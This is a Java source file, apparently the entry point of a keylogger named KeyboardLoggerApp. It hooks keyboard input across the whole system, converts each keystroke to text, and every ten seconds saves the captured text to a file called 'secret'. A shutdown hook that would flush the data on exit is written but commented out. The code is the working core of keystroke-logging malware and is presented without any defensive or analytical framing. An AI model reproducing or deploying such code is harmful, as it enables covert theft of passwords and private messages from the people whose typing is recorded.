package com.keytracker;


import com.keytracker.file.MyWriter;
import com.keytracker.threads.MainThread;
import de.ksquared.system.keyboard.GlobalKeyListener;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class KeyboardLoggerApp {
    public static void main(String[] args) {
        KeyAppender keyAppender = new KeyAppender();
//        ArgsResolver argsResolver = new ArgsResolver(args);
//        StoreMechanism storeMechanism = argsResolver.getStoreMechanism(keyAppender, new MyWriter("secret"));

        StoreMechanism storeMechanism = new FileStoreMechanism(keyAppender, new MyWriter("secret"));
        KeyResolver keyResolver = new AsciToStringKeyResolver(new CharactersProvider());
        KeyListenerImpl keyListener = new KeyListenerImpl(keyResolver, keyAppender);
        new GlobalKeyListener().addKeyListener(keyListener);

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(storeMechanism::store, 10, 10, TimeUnit.SECONDS);
//        shutdownHook(storeMechanism);
    }

    private static void shutdownHook(StoreMechanism fileStoreMechanism) {
        Runtime.getRuntime().addShutdownHook(new Thread(fileStoreMechanism::store, "Shutdown-thread"));
    }
}